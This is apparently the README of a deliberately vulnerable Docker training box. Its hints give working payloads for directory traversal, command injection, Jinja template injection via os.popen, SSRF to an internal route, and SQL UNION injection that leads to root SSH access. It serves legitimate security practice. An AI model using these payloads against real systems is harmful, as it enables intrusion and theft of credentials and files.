
## Requirements:
1. Docker > https://www.docker.com/get-started/
2. Docker Compose

### To start the box:
```
docker compose down && docker compose up -d --build

docker compose up  
```

### Here are the hints for the exploits:

<details>
<summary>
Directory Traversal - Port 8001
</summary>

In the URL, change `?page=home.php` to either

`?page=/flag.txt` or `?page=../../../../../../../../flag.txt`
</details>

<details>
<summary>
Command Injection - Port 8002
</summary>

Open Developer Mode in the browser, and edit one of the options:

```
<option value="date">date</option>
```
to
```
<option value="/bin/cat /flag.txt">i own you</option>
```
then hit Submit.
</details>

<details>
<summary>
Server-Side Template Injection - Port 8003
</summary>

In the box, input this string:
```
{{config.__class__.__init__.__globals__['os'].popen('/bin/cat /flag.txt').read()}}
```
</details>

<details>
<summary>
Server-Side Request Forgery - Port 8004
</summary>

After enumeration, find the `/fetch` API, and the snarky `/hack` route. Then, edit the URL to this:
```
http://<box-ip>:8004/fetch?url=http://localhost:5000/hack
```
Note: this is less likely to work while running this on your localhost. To test this one effectively, try connecting to this box from a separate computer on the same network.
</details>

<details>
<summary>
SQL Injection - Port 8005
</summary>
Send these strings.

`" UNION SELECT password FROM users WHERE name='admin'#` password
`" UNION SELECT password FROM email WHERE name='admin'#` user 

and then connect to the box's SSH server.
```
ssh -p 2222 root@<box-ip>
cat /flag.txt
```
</details>
